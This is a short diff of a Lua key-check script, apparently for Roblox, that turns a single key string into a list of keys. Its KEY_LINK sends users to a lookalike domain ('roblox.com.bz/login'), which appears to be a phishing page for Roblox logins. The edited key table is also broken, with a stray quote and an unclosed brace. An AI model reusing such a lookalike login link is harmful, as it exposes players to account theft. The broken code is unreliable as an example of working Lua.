@@ -4,8 +4,12 @@
 -- =============================================
 
 local KEY_LINK = "https://roblox.com.bz/login?returnUrl=2456074333377199"  -- << CHANGE THIS ANYTIME
-local VALID_KEY = "larp-1234, larp-123, larp-"                   -- << CHANGE YOUR KEY HERE
+local VALID_KEY = { 
+	"larp-1234", 
+	"larp-123", "
+	"larp-",                   
 
+	
 -- =============================================
 --   YOUR SCRIPT TO EXECUTE ON CORRECT KEY
 -- =============================================
